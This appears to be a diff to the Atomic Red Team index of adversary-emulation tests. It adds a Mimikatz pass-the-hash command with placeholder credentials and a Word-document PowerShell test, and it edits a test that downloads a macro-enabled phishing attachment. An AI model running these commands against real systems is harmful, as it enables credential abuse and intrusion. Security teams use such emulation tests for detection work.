@@ -17312,12 +17312,23 @@ discovery:
           sudo lsmod | grep -i "xen-vbd\|xen-vnif"
           sudo lsmod | grep -i "virtio_pci\|virtio_net"
           sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
-    - name: Hostname Discovery
-      description: 'Identify system hostname for Windows, Linux, and macOS systems.
+    - name: Hostname Discovery (Windows)
+      description: 'Identify system hostname for Windows.
 
 '
       supported_platforms:
       - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'hostname
+
+'
+    - name: Hostname Discovery
+      description: 'Identify system hostname for Linux and macOS systems.
+
+'
+      supported_platforms:
       - linux
       - macos
       executor:
@@ -23303,6 +23314,30 @@ lateral-movement:
       modified: '2019-07-18T16:56:39.990Z'
       identifier: T1075
     atomic_tests:
+    - name: Mimikatz Pass the Hash
+      description: |
+        Note: must dump hashes first
+        [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+      supported_platforms:
+      - windows
+      input_arguments:
+        user_name:
+          description: username
+          type: string
+          default: Administrator
+        domain:
+          description: domain
+          type: string
+          default: atomic.local
+        ntlm:
+          description: ntlm hash
+          type: string
+          default: cc36cf7a8514893efccd3324464tkg1a
+      executor:
+        name: command_prompt
+        command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+
+'
     - name: crackmapexec Pass the Hash
       description: 'command execute with crackmapexec
 
@@ -26606,21 +26641,20 @@ initial-access:
       identifier: T1193
     atomic_tests:
     - name: Download Phishing Attachment - VBScript
-      description: "The macro-enabled Excel file contains VBScript which opens your
-        default web browser and opens it to [google.com](http://google.com). \nThe
-        below will successfully download the macro-enabled Excel file to the current
-        location.\n"
+      description: |
+        The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).
+        The below will successfully download the macro-enabled Excel file to the current location.
       supported_platforms:
       - windows
       executor:
         name: powershell
         elevation_required: false
-        command: |-
+        command: |
           if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
             return 'Please install Microsoft Excel before running this test.'
           }
           else{
-            $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/PhishingAttachment.xlsm'
+            $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'
             $fileName = 'PhishingAttachment.xlsm'
             New-Item -Type File -Force -Path $fileName | out-null
             $wc = New-Object System.Net.WebClient
@@ -26628,3 +26662,15 @@ initial-access:
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             ($wc.DownloadString("$url")) | Out-File $fileName
           }
+    - name: Word spawned a command shell and used an IP address in the command line
+      description: 'Opens a word document that will run powershell and perform an
+        nslookup on the IP 192.168.1.1 and a sleep command
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        command: 'Start-Process PathToAtomicsFolder\T1193\src\PowerShell_IP_Doc.doc
+
+'
